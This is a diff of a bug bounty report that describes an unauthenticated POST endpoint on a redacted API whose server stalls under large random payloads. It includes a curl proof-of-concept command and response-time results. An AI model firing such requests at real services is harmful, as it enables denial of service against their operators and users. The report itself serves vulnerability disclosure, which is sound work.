@@ -1,8 +1,8 @@
 # /Redacted/ API - Unauthenticated POST Request Leading to Server Stall (DoS Vector)
 
-**Status:** Submitted *(pending re-evaluation)*  
+**Status:** Submitted *(pending re-evaluation from informational)*  
 **Severity (Suggested):** Medium → High (DoS Potential)  
-**Target Scope:** https://*.*.com/
+**Target Scope:** https://[redacted].[redacted].com/
 
 ---
 
@@ -23,10 +23,10 @@ This finding escalates the previously reported "endpoint enumeration" behavior i
 
 **Evidence of Allowed Methods:**
 
-OPTIONS /1/*/*/* → 200 OK
+OPTIONS /1/[redacted]/[redacted]/[redacted] → 200 OK
 allow: POST, OPTIONS
 
-OPTIONS /1/*/*/* → 200 OK
+OPTIONS /1/[redacted]/[redacted]/[redacted] → 200 OK
 allow: POST, OPTIONS
 
 ---
@@ -53,7 +53,7 @@ This attack **does not require login**, meaning it can be triggered at scale.
 ### Test Command
 
 time curl -s -o /dev/null -X POST \
-"https://*.com/1/*/*/*" \
+"https://[redacted].com/1/[redacted]/[redacted]/[redacted]" \
 -H "Content-Type: application/json" \
 -d '{"loop":"'$(head -c 5000 /dev/urandom | base64)'"}'
 
@@ -61,7 +61,7 @@ time curl -s -o /dev/null -X POST \
 
 ## Observed Results
 
-/3/*/*/*
+/3/[redacted]/[redacted]/[redacted]
 
 | Attempt | Responses Time | Behavior |
 |----------|-------------------------|----------------|
@@ -69,7 +69,7 @@ time curl -s -o /dev/null -X POST \
 | #2 | ~0.91s | Latency Increased |
 | #3 | ~135.73s | Backend Stall |
 
-/1/*/*/*
+/1/[redacted]/[redacted]/[redacted]
 | Attempt | Responses Time | Behavior |
 |----------|-------------------------|----------------|
 | #1 | ~0.64s | Normal |
